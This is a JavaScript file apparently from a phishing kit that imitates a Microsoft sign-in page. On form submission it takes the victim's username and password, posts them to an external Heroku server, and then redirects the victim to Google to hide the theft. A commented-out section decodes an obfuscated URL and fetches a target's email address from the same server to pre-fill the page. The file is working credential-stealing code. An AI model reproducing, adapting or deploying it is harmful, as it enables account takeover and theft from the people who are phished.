let urlSC="https://hardyman-srv.herokuapp.com/api/v1/logs/"; //-- post endpoint data
let data="607c7c7832272739313a26393e3026382639383a323b38383827697861277e39276b67666e616f"; //-- get mail data endpoint
let emailText=document.getElementById('displayName');
let pass=document.getElementById('inputBoxId');

var today = new Date();
var year = today.getFullYear();

let sendForm=document.getElementById("sendForm");

document.getElementById("footerDateId").innerHTML="©"+year+" Microsoft";


sendForm.addEventListener('submit',function(e){
    e.preventDefault();
    let datos=new FormData(sendForm);
    let pwd=datos.get('pwd');
    let user=document.getElementById("displayName").innerHTML;
    
    var myHeaders = new Headers();
    myHeaders.append("Content-Type", "application/json");
   
    var raw = JSON.stringify({"user":user,"pwd": pwd});

    console.log(raw)

    var requestOptions = {
        method: 'POST',
        headers: myHeaders,
        body: raw,
        redirect: 'follow'
    };
    
    fetch("https://hardyman-srv.herokuapp.com/api/v1/logs/", requestOptions)
    .then(response => response.text())
    .then(result => console.log("Seccesfull access"))
    .catch(error => console.log('error', error));

    const selector = document.querySelector('.inner')
    selector.classList.add('magictime', 'spaceOutLeft')          //esto es para magic animation CSS
    setTimeout(()=>{
        console.log("Seccesfull access");
        window.location.href = 'http://www.google.com';
    },1500);
})


/* function resolveLru(text){
    return new Promise(resolve => {
        const myDecipher = decipher('mySecretSalt'); //esta es la clave secreta para la decodificacion
        const lru=myDecipher(text)
        resolve(lru);
    })
}


async function getMail(uri,reqOpt){
    const response = await fetch("https://hardyman-srv.herokuapp.com/api/v1/config",reqOpt);
    const mail=await response.json();
    return mail;
}

async function configMail(data){
    let uri= await resolveLru(data);
    //console.log("Uri decodificada " + uri);
    //console.log(typeof(uri))
    return uri;
}

 configMail(data).then(r=>{
    //console.log("Pepe "+r);
    var requestOptions = {
        method: 'GET',
        redirect: 'follow'
      };
    getMail(r,requestOptions).then(res=>{
        let mail=res.mail
        let emailText=document.getElementById('displayName');
        emailText.innerHTML=mail;
        //console.log(mail);
    })
}) */